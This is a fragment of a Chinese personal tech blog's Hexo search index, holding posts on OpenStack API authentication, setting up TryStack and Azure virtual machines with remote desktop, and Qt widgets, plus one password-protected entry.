            <tag> wwwnet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2015年3月22日</title>
      <link href="zm/2015-3-22.html"/>
      <url>zm/2015-3-22.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4e4d9ffbdc36f7d8eaf9163ad1e5051a29ad7909d60bfa5f32d24e22c358a682">91a3f98ed694b0f3ce330b314503f443b0b87b516d732ab68c7a5c3e36d26f24e6057df5c83e1cde98adbed0d12b0e3b0ce7f5bb8530a4b83fd4a98bcc0c7fbe27e48f8d22eaee115d2ff2ac0876cff49ab534b15b2ce882a931c993e021530a6aadbcca1591ece8740bd711830ab0259c3a9de73ba856ef16701c08b12b45ccfc8d27d841f0d1ca1e6a6472dc21e4dd1b1398db3eb6387182558d38b275f649</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> zm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>OpenStack Apis Authenticate (Token ID&amp;Tenant ID)</title>
      <link href="openstack/openstack-apis-authenticate.html"/>
      <url>openstack/openstack-apis-authenticate.html</url>
      
        <content type="html"><![CDATA[<p>调用openstack api需要先发送认证请求，需要获取Token ID和Tenant   使用trystack的话需要获得username，password，tenant,name和认证地址等选项，获取方法如下：</p><h3 id="1-获取api密码"><a href="#1-获取api密码" class="headerlink" title="1. 获取api密码"></a>1. 获取api密码</h3><p>登录成功后点击右上角的用户名选择设置，然后选择左侧的“API Password”,然后点击“Request API password”按钮，获取你的 Api密码，获取之后自行记住。然后你需要退出重新登录，可以直接用用户名：facebook*** 密码就是刚刚获取的登录。<br><img data-src="/images/uploads/2014/12/12.png" alt="image"></p><h3 id="2-获取认证地址，tenant-name等信息"><a href="#2-获取认证地址，tenant-name等信息" class="headerlink" title="2. 获取认证地址，tenant name等信息"></a>2. 获取认证地址，tenant name等信息</h3><p>点击左侧dashboard的Compute选项中的访问和安全，选择右侧的“访问&amp;安全”选项，然后点击“下载OpenStack RC文件”按钮，下载文件至本地。<br><img data-src="/images/uploads/2014/12/2-1.png" alt="image"><br>下载完成后代开下载的文件，需要的信息已经在下图圈出。  </p><span id="more"></span><h3 id="3-获取其他信息"><a href="#3-获取其他信息" class="headerlink" title="3. 获取其他信息"></a>3. 获取其他信息</h3><p>认证获取Token ID 和 Tenant ID(其实tenant id上图的openstack RC文件中已经给出来了)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding: UTF-8 -*-  </span></span><br><span class="line"><span class="keyword">import</span> urllib, httplib, json, urlparse</span><br><span class="line">FLOATING_IP = <span class="string">&#x27;8.21.28.*&#x27;</span>                   <span class="comment">#你的认证ip</span></span><br><span class="line">TENANT_NAME = <span class="string">&#x27;your tenant name&#x27;</span></span><br><span class="line">USERNAME = <span class="string">&#x27;your username&#x27;</span></span><br><span class="line">PASSWD = <span class="string">&#x27;your password&#x27;</span></span><br><span class="line"></span><br><span class="line">url = FLOATING_IP + <span class="string">&#x27;:5000&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    params = <span class="string">&#x27;&#123;&quot;auth&quot;: &#123;&quot;tenantName&quot;:&quot;&#x27;</span> + TENANT_NAME + <span class="string">&#x27;&quot;, &quot;passwordCredentials&quot;:&#123;&quot;username&quot;:&quot;&#x27;</span> + USERNAME + <span class="string">&#x27;&quot;, &quot;password&quot;:&quot;&#x27;</span> + PASSWD + <span class="string">&#x27;&quot;&#125;&#125;&#125;&#x27;</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;</span><br><span class="line">    conn = httplib.HTTPConnection(url)</span><br><span class="line">    conn.request(<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;/v2.0/tokens&#x27;</span>,params,headers)</span><br><span class="line">    response = conn.getresponse()</span><br><span class="line">    data = response.read()</span><br><span class="line">    dd = json.loads(data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;error&#x27;</span> <span class="keyword">in</span> dd:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Error,Openstack Authorized Failed!&#x27;</span></span><br><span class="line">        conn.close()</span><br><span class="line">        exit()</span><br><span class="line">    conn.close()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span> url + <span class="string">&#x27;/v2.0/tokens&#x27;</span>, e</span><br><span class="line">    conn.close()</span><br><span class="line">    exit()</span><br><span class="line"> </span><br><span class="line">token_id = dd[<span class="string">&#x27;access&#x27;</span>][<span class="string">&#x27;token&#x27;</span>][<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">tenant_id = dd[<span class="string">&#x27;access&#x27;</span>][<span class="string">&#x27;token&#x27;</span>][<span class="string">&#x27;tenant&#x27;</span>][<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;token : &quot;</span> + token_id</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;tenant id : &quot;</span> + tenant_id</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> openstack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openstack </tag>
            
            <tag> Authenticate </tag>
            
            <tag> token </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Trystack创建实例并通过ssh远程登录虚拟机</title>
      <link href="openstack/trystack-create-instance-and-use-ssh-login.html"/>
      <url>openstack/trystack-create-instance-and-use-ssh-login.html</url>
      
        <content type="html"><![CDATA[<p>这是Trystack的官方介绍：</p><blockquote><p>The Easiest Way To Try Out OpenStack. We’ve set up large clusters of hardware running OpenStack on both x86 and ARM architectures. The best part? It’s totally free for you to try &amp; test your apps—thanks to our generous individual and corporate contributors.<br>trystack提供一个免费的openstack环境给你尝试测试你的apps,你新建的虚拟机只会存在24小时，所以只能用于测试，不能用于生产环境。</p></blockquote><p>Trystack传送门:<a href="http://trystack.org/">http://trystack.org</a></p><p>下面介绍详细步骤：</p><h3 id="1-申请加入trystack的facebook小组"><a href="#1-申请加入trystack的facebook小组" class="headerlink" title="1. 申请加入trystack的facebook小组"></a>1. 申请加入trystack的facebook小组</h3><p>点击首页的 Join Our Facebook Group，申请加入trystack的facebook小组，这个不是立即生效的，基本上申请了都会加入，请等待小组的管理员通过你的申请。（facebook被墙了，怎么访问的话我这里不做介绍）<br><img data-src="/images/uploads/2014/12/1.png" alt="image"></p><h3 id="2-登录trystack"><a href="#2-登录trystack" class="headerlink" title="2. 登录trystack"></a>2. 登录trystack</h3><p>确保你加入了小组之后，就能点击trystack首页的登录按钮，使用facebook帐号验证，登录成功后如下图所示，可以看到，你的用户名形如 facebook*******<br><img data-src="/images/uploads/2014/12/3.png" alt="image"></p><span id="more"></span><h3 id="3-创建子网"><a href="#3-创建子网" class="headerlink" title="3. 创建子网"></a>3. 创建子网</h3><p>点击openstack dashboard左侧的网络，在点击展开后的网络选项，点击右侧的“创建网络”按钮，打开创建网络的对话框。<br><img data-src="/images/uploads/2014/12/4.png" alt="image"></p><p>在网络选项中输入网络的名称，子网选项中输入子网名称，子网地址（注意格式），其他默认即可，点击下一步完成创建。（也可以在子网详情中设置DHCP，ip的范围，和主机路由等选项，这里不多介绍），创建成功后如下图所示。<br><img data-src="/images/uploads/2014/12/5.png" alt="image"></p><h3 id="4-创建路由"><a href="#4-创建路由" class="headerlink" title="4. 创建路由"></a>4. 创建路由</h3><p>点击openstack dashboard左侧的网络，在点击展开后的路由选项，点击右侧的 “新建路由”按钮，打开新建路由的对话框。</p><p>输入路由名字就可以了，就不上图了，创建完成后点击“设置网关”打开路由的网关设置页，选择默认的 external 网络。<br><img data-src="/images/uploads/2014/12/7.png" alt="image"></p><p>完成后点击路由的名称，进入路由的详情页面，点击“增加接口”按钮，增加前面创建的子网。<br><img data-src="/images/uploads/2014/12/8.png" alt="image"></p><h3 id="5-创建密钥对"><a href="#5-创建密钥对" class="headerlink" title="5. 创建密钥对"></a>5. 创建密钥对</h3><p>trystack的镜像没有用户名、密码，需要是要密钥登录。点击openstack dashboard左侧的compute，在点击展开后的“访问&amp;安全”选项，选择 “密钥对”选项，点击左侧的“创建密钥对”按钮，打开创建密钥对的窗口。<br><img data-src="/images/uploads/2014/12/9.png" alt="image"><br><img data-src="/images/uploads/2014/12/10.png" alt="image"></p><p>创建成功后会自动打开下载窗口，保存私钥到本地磁盘，后面用来ssh登录虚拟机。<br><img data-src="/images/uploads/2014/12/11.png" alt="image"></p><h3 id="6-创建虚拟机"><a href="#6-创建虚拟机" class="headerlink" title="6. 创建虚拟机"></a>6. 创建虚拟机</h3><p>点击openstack dashboard左侧的compute，在点击展开后的“实例”选项，点击右侧的 “启动云主机”选项，打开新建虚拟机的窗口。<br><img data-src="/images/uploads/2014/12/121.png" alt="image"></p><p>依次填入云主机名称，选择云主机类型，启动源，镜像名称等选项，选择上方的“访问&amp;安全”选项，选择前面创建的密钥对。<br><img data-src="/images/uploads/2014/12/131.png" alt="image"></p><p>然后下一步，点击“网络”选项，选择前面创建的网络。<br><img data-src="/images/uploads/2014/12/141.png" alt="image"></p><p>其他选项可以忽略，直接点击“运行”按钮，完成创建后如下图所示：<br><img data-src="/images/uploads/2014/12/151.png" alt="image"></p><h3 id="7-绑定floating-ip"><a href="#7-绑定floating-ip" class="headerlink" title="7. 绑定floating ip"></a>7. 绑定floating ip</h3><p>选择虚拟机最后行的动作中的“绑定浮动ip”<br><img data-src="/images/uploads/2014/12/16.png" alt="image"></p><p>打开绑定浮动ip的窗口，如果没有分配过浮动ip，需要点击下图的“+”号，分配一个浮动ip<br><img data-src="/images/uploads/2014/12/17.png" alt="image"></p><p>关联成功后如下图所示，图中的红色标记既为分配到的浮动ip，可以通过这个地址远程访问虚拟机。<br><img data-src="/images/uploads/2014/12/18.png" alt="image"></p><h3 id="8-设置安全组规则"><a href="#8-设置安全组规则" class="headerlink" title="8. 设置安全组规则"></a>8. 设置安全组规则</h3><p>点击openstack dashboard左侧的compute，在点击展开后的“访问&amp;安全”选项，选择 “安全组”选项，点击管理规则，打开规则的新窗口。<br><img data-src="/images/uploads/2014/12/19.png" alt="image"></p><p>点击“添加规则”按钮，依次添加ICMP出入站规则和SSH规则。<br><img data-src="/images/uploads/2014/12/20.png" alt="image"><br><img data-src="/images/uploads/2014/12/21.png" alt="image"><br><img data-src="/images/uploads/2014/12/22.png" alt="image"><br><img data-src="/images/uploads/2014/12/23.png" alt="image"></p><p>至此，openstack上的设置全部完成，我们已经可以在本地计算机ping通虚拟机的floating ip。<br><img data-src="/images/uploads/2014/12/24.png" alt="image"></p><h3 id="9-SSH登录虚拟机"><a href="#9-SSH登录虚拟机" class="headerlink" title="9. SSH登录虚拟机"></a>9. SSH登录虚拟机</h3><p>打开PuTTYGen，首先导入前面保存的私钥。导入的时候选择所有文件，这样才能导入openstack的密钥 *.pem<br><img data-src="/images/uploads/2014/12/26.png" alt="image"></p><p>导入成功后保存私钥为putty使用的格式（经测试putty直接使用openstack的私钥*.pem会报错）<br><img data-src="/images/uploads/2014/12/27.png" alt="image"></p><p>保存成功后打开putty导入保存的私钥。<br><img data-src="/images/uploads/2014/12/28.png" alt="image"></p><p>转到Session，输入floating ip登录<br><img data-src="/images/uploads/2014/12/29.png" alt="image"></p><p>连接成功后使用用户名“centos”，无需密码即可登录。<br><img data-src="/images/uploads/2014/12/30.png" alt="image">  </p><hr><h3 id="附录："><a href="#附录：" class="headerlink" title="附录："></a>附录：</h3><p><a href="http://zh.wikipedia.org/wiki/RSA%E5%8A%A0%E5%AF%86%E6%BC%94%E7%AE%97%E6%B3%95">RSA加密算法</a></p>]]></content>
      
      
      <categories>
          
          <category> openstack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openstack </tag>
            
            <tag> trystack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>纵有千言万语，却不知道从何而说，也不知道该说些什么……</title>
      <link href="life/i-miss-you.html"/>
      <url>life/i-miss-you.html</url>
      
        <content type="html"><![CDATA[<p><img data-src="/images/uploads/2014/10/sad.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> life </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Qt常用窗口部件</title>
      <link href="qt/qt-commonly-used-widgets.html"/>
      <url>qt/qt-commonly-used-widgets.html</url>
      
        <content type="html"><![CDATA[<p>从《C++.GUI.Qt.4编程(第二版)》上整理来的。</p><ol><li><p>Qt提供4中类型的按钮：QPushButton、QToolButton、QCheckBox 和 QRadioButton。QPushButton和QToolButton一般执行某个动作，但也可用作触发按纽。QCheckBox一般用来提供多选项，而QRadioButton常用于提供单选项。<br><img data-src="/images/uploads/2014/10/1.png" alt="image"></p></li><li><p>Qt的容器窗口部件是一种可以包含其他窗口部件的窗口部件。QFrame可画些简单的图形，也可作为其他控件的基类，如QToolBox，QLabel等。<br><img data-src="/images/uploads/2014/10/2.png" alt="image"></p><span id="more"></span></li><li><p>QTabWidget 和 QToolBox 是多页窗口部件。在多页窗口部件中，每一页都是一个子窗口部件，并从 0 开始编号这些页。对于一个QTabWidget，它的每个Tab标签的位置和形状都可以进行设置。<br><img data-src="/images/uploads/2014/10/3.png" alt="image"></p></li><li><p>项视图窗口部件<br><img data-src="/images/uploads/2014/10/4.png" alt="image"></p></li><li><p>显示窗口部件。如下图，QLabel是这些窗口部件中最重要的一个，它可以用来显示普通文本、图片和 HTML。QTextBrowser是一个只读类型的 QTextEdit 子类，它可以显示带格式的文本。它优先用于处理大型格式化文本文档的 QLabel 中，与 QLable 不同的是，QTextBrowser 会在必要的时自动提供滚动条，同时还提供键盘和鼠标导航的广泛支持。（Qt助手就是使用QTextBrowser来为用户呈现文档的）<br><img data-src="/images/uploads/2014/10/5.png" alt="image"></p></li><li><p>Qt提供数个用于数据输入的窗口部件。如图，QLineEdit可以使用一个输入掩码、一个校验器或者同时使用两者对它的输入进行限定。QTextEdit 是QAbstractScrollArea的子类，具有处理大量文本的能力。一个QTextEdit可以设置用于编辑普通文本还是富文本。在编辑富文本的时候，它可以显示 Qt 富文本引擎支持的所有元素，QLineEdit 和 QTextEdit 都对剪切板提供完美支持。<br><img data-src="/images/uploads/2014/10/6.png" alt="image"></p></li><li><p>Qt提供一个通用消息框和一个能记住它所显示的消息内容的错误对话框。可以使用 QProcessDialog 或者 5 中的 QProcessBar 来对那些非常耗时的操作进行指示。当用户只需要输入一行文本或者一个数字的时候，使用 QInputDialog 会非常方便。<br><img data-src="/images/uploads/2014/10/7.png" alt="image"></p></li><li><p>Qt提供一套标准的通用对话框，这样可以要用户很容易的选择字体、颜色、文件或者文档打印。如下图。<br><img data-src="/images/uploads/2014/10/8.png" alt="image"></p></li><li><p>利用QWizard可方便快捷的创建向导（Mac上称作助手），向导常用于帮助用户完成复杂或是很少用到的操作。<br><img data-src="/images/uploads/2014/10/9.png" alt="image"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> qt </category>
          
      </categories>
      
      
        <tags>
            
            <tag> qt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在OpenLogic上安装桌面环境并通过Windows远程桌面登录</title>
      <link href="windows/install-openlogic-desktop-envirnment.html"/>
      <url>windows/install-openlogic-desktop-envirnment.html</url>
      
        <content type="html"><![CDATA[<blockquote><p> 为700多个不同的开源代码包 提供服务和支持，包括了对CentOS的商业级支持，派生自Red Hat Enterprise Linux为公众提供的源代码的企业级 Linux 分布。</p></blockquote><p>以上是网上找到的关于OpenLogic的介绍，反正当CentOS用就是了,更多详细的信息，可以移步OpenLogic的官网：<a href="http://www.openlogic.com/">http://www.openlogic.com</a></p><h2 id="创建OpenLogic虚拟机"><a href="#创建OpenLogic虚拟机" class="headerlink" title="创建OpenLogic虚拟机"></a>创建OpenLogic虚拟机</h2><p>过程不再赘述，并且添加22和3389端口，添加方法可以参照 <a href="https://www.sunmite.com/windows/use-mstsc-connect-azure-ubuntu.html">使用windows远程桌面连接Windows Azure中的Ubuntu虚拟机</a></p><h2 id="安装桌面环境（Gnome）"><a href="#安装桌面环境（Gnome）" class="headerlink" title="安装桌面环境（Gnome）"></a>安装桌面环境（Gnome）</h2><p>使用Putty连接上虚拟机<br>GNOME desktop需要NetworkManager，但是NetworkManager和Azure VM的WALinuxAgent插件冲突。解决办法如下：</p><h3 id="1-编辑-etc-yum-conf-在文件的结尾添加以下内容："><a href="#1-编辑-etc-yum-conf-在文件的结尾添加以下内容：" class="headerlink" title="1. 编辑 /etc/yum.conf 在文件的结尾添加以下内容："></a>1. 编辑 /etc/yum.conf 在文件的结尾添加以下内容：</h3><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">exclude</span>=NetworkManager</span><br></pre></td></tr></table></figure><p>然后执行</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">yum</span> clean <span class="literal">all</span></span><br><span class="line"><span class="attribute">yum</span> groupinstall basic-desktop desktop-platform x<span class="number">11</span> fonts</span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="2-或者直接执行以下命令："><a href="#2-或者直接执行以下命令：" class="headerlink" title="2. 或者直接执行以下命令："></a>2. 或者直接执行以下命令：</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">yum groupinstall basic-desktop desktop-platform x11 fonts  \</span><br><span class="line">  <span class="attribute">--exclude</span>=NetworkManager  <span class="attribute">--exclude</span>=NetworkManager-gnome</span><br></pre></td></tr></table></figure><p>安装完成后重启虚拟机，使用Putty重新连接。</p><h2 id="安装VNC和XRDP"><a href="#安装VNC和XRDP" class="headerlink" title="安装VNC和XRDP"></a>安装VNC和XRDP</h2><h3 id="1-使用以下命令安装VNC"><a href="#1-使用以下命令安装VNC" class="headerlink" title="1. 使用以下命令安装VNC"></a>1. 使用以下命令安装VNC</h3><figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line">yum install vnc vnc-<span class="keyword">server</span></span><br></pre></td></tr></table></figure><p>默认的源没有xrdp，所以我自己找了一个rpm包安装，使用以下命令下载rpm包并安装：</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">wget</span> http://dl.fedoraproject.org/pub/epel/<span class="number">6</span>/x<span class="number">86</span>_<span class="number">64</span>/xrdp-<span class="number">0</span>.<span class="number">5</span>.<span class="number">0</span>-<span class="number">0</span>.<span class="number">13</span>.el<span class="number">6</span>.x<span class="number">86</span>_<span class="number">64</span>.rpm</span><br><span class="line"><span class="attribute">rpm</span> -ivh xrdp-<span class="number">0</span>.<span class="number">5</span>.<span class="number">0</span>-<span class="number">0</span>.<span class="number">13</span>.el<span class="number">6</span>.x<span class="number">86</span>_<span class="number">64</span>.rpm</span><br></pre></td></tr></table></figure><p>上述链接已经失效，可以参考下面的连接完成安装<br><a href="http://www.itzgeek.com/how-tos/linux/centos-how-tos/install-xrdp-on-centos-7-rhel-7.html">Install xrdp on CentOS 7 / RHEL 7</a></p><h3 id="2-设置开机自启自启"><a href="#2-设置开机自启自启" class="headerlink" title="2. 设置开机自启自启"></a>2. 设置开机自启自启</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">chkconfig</span> xrdp <span class="literal">on</span></span><br><span class="line">chkconfig vncserver <span class="literal">on</span></span><br></pre></td></tr></table></figure><h3 id="3-修改虚拟机运行级别"><a href="#3-修改虚拟机运行级别" class="headerlink" title="3. 修改虚拟机运行级别"></a>3. 修改虚拟机运行级别</h3><p>前面一直不成功，就是这一步没有设置），编辑/etc/inittab文件，修改启级别为5</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /etc/inittab</span></span><br><span class="line"><span class="attribute">id</span>:<span class="number">3</span>:initdefault:    </span><br><span class="line"><span class="comment">#修改为  </span></span><br><span class="line"><span class="attribute">id</span>:<span class="number">5</span>:initdefault:</span><br></pre></td></tr></table></figure><p>修改完成后重启虚拟机</p><h4 id="4-下载远程桌面文件"><a href="#4-下载远程桌面文件" class="headerlink" title="4. 下载远程桌面文件"></a>4. 下载远程桌面文件</h4><p>登录虚拟机，如果登录被拒绝，请查看iptables设置，登录成功后如下图所示：<br><img data-src="/images/uploads/2014/08/32.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openlogic </tag>
            
            <tag> desktop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用windows远程桌面连接Windows Azure中的Ubuntu虚拟机</title>
      <link href="windows/use-mstsc-connect-azure-ubuntu.html"/>
      <url>windows/use-mstsc-connect-azure-ubuntu.html</url>
      
        <content type="html"><![CDATA[<p>上次连接windows的虚拟机的过程还是很简单的，但是尝试ubuntu虚拟机的时候遇到一点问题，找了一下解决方法。</p><ol><li><p>创建ubuntu虚拟机，这里同样不再赘述，创建过程和创建Windows虚拟机基本一样，只是登录可以选择密钥注入或者用户名密码（为了方便我选择了用户名密码认证），创建完成后，查看虚拟机详情中的端口信息，已经开启22端口，如下图：<br><img data-src="/images/uploads/2014/08/11.png" alt="image"></p></li><li><p>下载putty连接虚拟机，使用创建虚拟机时的用户名密码（HOST NAME就是虚拟机的DNS名称），如下图：<br><img data-src="/images/uploads/2014/08/21.png" alt="image"></p></li><li><p>连接成功之后执行以下命令，安装桌面环境和XRDP ，安装完成后，reboot重启系统。<br><img data-src="/images/uploads/2014/08/333.png" alt="image"></p></li><li><p>在虚拟机添加3389端口，点击“添加”按钮，按下图操作进行（如果已经开启3389端口可以跳过此部）<br><img data-src="/images/uploads/2014/08/31.png" alt="image"><br><img data-src="/images/uploads/2014/08/4.png" alt="image"></p></li><li><p>然后和连接windows虚拟机一样，下载远程桌面连接文件，登录虚拟机<br><img data-src="/images/uploads/2014/08/5.png" alt="image"></p></li><li><p>登录后如下图所示</li><br><img data-src="/images/uploads/2014/08/6.png" alt="image"></p><span id="more"></span><p>如上图所示，无法显示桌面，爬文后了解到是：</p><blockquote><p>由于xrdp、gnome和unity之间的兼容性问题，在Ubuntu 14.04版本中仍然无法使用xrdp登陆gnome或unity的远程桌面，现象是登录后只有黑白点为背景，无图标也无法操作。与13.10中的解决方式相同，使用xrdp只能登录xfce的远程桌面。</p></blockquote></li></ol><p>我新建虚拟机的时候选得是14.04 LTS版，解决办法换12.04 LTS重复以上步骤，或者执行以下命令更换桌面环境为xfce</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install xfce4</span><br><span class="line">sudo apt-<span class="builtin-name">get</span> install xrdp vnc4server</span><br><span class="line">echo xfce4-session ~/.xsession</span><br><span class="line">sudo<span class="built_in"> service </span>xrdp restart</span><br></pre></td></tr></table></figure><p>之后远程桌面重新登录，成功后，如下图所示：<br><img data-src="/images/uploads/2014/08/7.png" alt="image"></p><p>还是不习惯xfce的风格虽然很简洁，看来我还是回12.04或者改装CentOS折腾openstack去……</p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> remote </tag>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Windows远程桌面连接Windows Azure中的winsows虚拟机</title>
      <link href="windows/use-mstsc-connect-azure-windows.html"/>
      <url>windows/use-mstsc-connect-azure-windows.html</url>
      
        <content type="html"><![CDATA[<p>前段时间得了微软的Windows Azure云的试用邀请码，也不知道可以用多久，赶紧把一些东西记下来，方便日后的查阅。</p><h3 id="创建虚拟机了，这里不再赘述，创建好后下图："><a href="#创建虚拟机了，这里不再赘述，创建好后下图：" class="headerlink" title="创建虚拟机了，这里不再赘述，创建好后下图："></a>创建虚拟机了，这里不再赘述，创建好后下图：</h3><p><img data-src="/images/uploads/2014/08/1.png" alt="image"></p><h3 id="点击虚拟机名称，展开虚拟机的详情"><a href="#点击虚拟机名称，展开虚拟机的详情" class="headerlink" title="点击虚拟机名称，展开虚拟机的详情"></a>点击虚拟机名称，展开虚拟机的详情</h3><p><img data-src="/images/uploads/2014/08/2.png" alt="image"></p><h3 id="下载远程桌面文件"><a href="#下载远程桌面文件" class="headerlink" title="下载远程桌面文件"></a>下载远程桌面文件</h3><p>选择最下方的连接，这是会弹出一个下载框，选择保存到本地的一个位置（其实就是虚拟机的远程桌面连接文件），下载完成之后，双击打开，输入创建虚拟机时设置的用户名密码<br><img data-src="/images/uploads/2014/08/3.png" alt="image"></p><h3 id="登录成功"><a href="#登录成功" class="headerlink" title="登录成功"></a>登录成功</h3><p>如下图所示，已经成功登录到虚拟机（虚拟机为Server 2012）。<br><img data-src="/images/uploads/2014/08/20140815145244.png" alt="image"><br>Azure可玩的东西还是很多的，下次在折腾其他的内容吧。</p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> remote </tag>
            
            <tag> Windows Azure </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
